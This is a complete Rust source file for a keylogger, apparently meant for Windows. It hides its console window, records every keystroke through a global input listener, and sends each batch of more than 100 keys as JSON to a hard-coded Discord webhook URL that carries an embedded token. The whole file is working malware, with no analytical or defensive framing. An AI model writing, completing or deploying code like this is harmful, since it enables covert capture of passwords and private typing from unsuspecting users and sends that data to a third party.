#![windows_subsystem = "windows"]
use rdev::{listen, Event};
use std::sync::{Arc, Mutex};
// use webhook::client::WebhookClient;
use reqwest::header::CONTENT_TYPE;
use serde_json::json;

#[tokio::main]
async fn main() {
    let data = Arc::new(Mutex::new(Vec::new()));

    let data_clone = Arc::clone(&data);
    let callback = move |event: Event| {
        match event.name {
            Some(string) => {
                // println!("{}", string);
                let mut data = data_clone.lock().unwrap();
                data.push(string);
                if data.len() > 100 {
                    let b = data.clone();
                    data.clear();
                    println!("cleared");
                    let client = reqwest::Client::new();
                    let url = "https://discord.com/api/webhooks/1172109187338215455/8z0k5iHoaqWeWff0XTKOLhFXoXaKo1qM6W1rPTrERqFWf6Ug74XrQsqSIokkNaBQMRiI";
                    // send_request(&client, &url);
                    println!("{:?}", b);
                    tokio::spawn(async move {
                        send_request(&client, &url,b).await;
                    });
                };

            },
            None => (),
        }
    };
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error);
    }
}

async fn send_request(client: &reqwest::Client, url: &str,data: Vec<String>) {

    let body = json!({
       "content": data.join("")
   });
    let response = client.post(url)
        .header(CONTENT_TYPE, "application/json")
        .body(body.to_string())
        .send();

    match response.await {
        Ok(res) => {
            if res.status() == reqwest::StatusCode::OK {
                println!("200");
            }
        }
        Err(err) => {
            println!("Error sending request: {}", err);
        }
    }
}